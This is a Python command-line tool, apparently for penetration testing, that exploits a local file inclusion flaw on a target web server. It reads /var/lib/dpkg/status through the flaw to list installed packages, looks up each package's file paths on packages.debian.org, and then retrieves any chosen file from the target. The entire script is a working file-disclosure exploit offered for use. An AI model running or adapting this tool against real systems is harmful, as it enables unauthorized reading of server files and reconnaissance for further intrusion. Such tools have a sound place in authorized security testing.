#!/usr/bin/python3

#==============================================
# Description:
#  Enumeration of dpkg package paths using LFI
#
# Author:
#  Slaven Vukcevic
#==============================================
import os
import re
import sys
import requests
import inquirer
from os import path

print('    __    _____       ____  __         ___                   ')
print('   / /   / __(_)     / __ \/ /______ _/   |    ____  __  __  ')
print('  / /   / /_/ /_____/ /_/ / //_/ __ `/ /| |   / __ \/ / / /  ')
print(' / /___/ __/ /_____/ ____/ ,< / /_/ / ___ |_ / /_/ / /_/ /   ')
print('/_____/_/ /_/     /_/   /_/|_|\__, /_/  |_(_) .___/\__, /    ')
print('                             /____/        /_/    /____/     ')

if len(sys.argv) > 1:
    LFI = sys.argv[1]
    print("Status.txt file exists: " + str(path.exists('status.txt')))
else:
    print('Usage: Python3 LFI-PkgA.py \"h++p://example.com/?file=../..\"')
    exit()

def SendReq(test):
    try:
        RestGPkg = requests.get('https://packages.debian.org/buster/arm64/' + test + '/filelist',  timeout=5).text
        FindPath = re.compile('<pre>(.*?)</pre>', re.DOTALL).search(RestGPkg)
        FindSplit = FindPath.group(1)
        Pth = re.split(r"\n", FindSplit)
        PathsQ = [inquirer.List('PthQuery', message="Request path: ", choices=Pth, ), ]
        PathsA = inquirer.prompt(PathsQ)
        RestGPth = requests.get(LFI + PathsA['PthQuery'], timeout=5)
        os.system('clear')
        print('[+] Start of file : ' + PathsA['PthQuery'] + '------------------ [+]')
        print(RestGPth.text)
        print('[+] End of file : ' + PathsA['PthQuery'] + '------------------ [+]')
    except requests.exceptions.Timeout as tmt:
        print(tmt)
    except:
        print('File not available.')
    WhatNext(test)

def WhatNext(test):
    Lpp = ['Enumerate "' + test + '" more.', 'Go back to main.']
    LoopQ = [inquirer.List('Maine', message="What's next?", choices=Lpp, ), ]
    LppA = inquirer.prompt(LoopQ)
    os.system('clear')
    if LppA['Maine'] == 'Go back to main.' : main()
    else : SendReq(test)

def main():
    if path.exists('status.txt') == False:
        try:
            RestGStat = requests.get(LFI + '/var/lib/dpkg/status', allow_redirects=True)
            open('status.txt', 'wb').write(RestGStat.content)
        except:
            print('Failed writing/obtaining status.txt')
            exit()
    file = open("status.txt", "r")
    Pkg = []
    for line in file:
        if "Package:" in line:
            PackageSec = re.split(r"\n", line)[0].split(": ")
            Pkg.append(PackageSec[1])
    PackagesQ = [inquirer.List('PkgQuery', message = "Chose package to obtain paths for: ", choices = Pkg,),]
    PackagesA = inquirer.prompt(PackagesQ)
    os.system('clear')
    print('[+] -----------------' + PackagesA['PkgQuery'] + '------------------ [+]')
    test = PackagesA['PkgQuery']
    SendReq(test)
main()





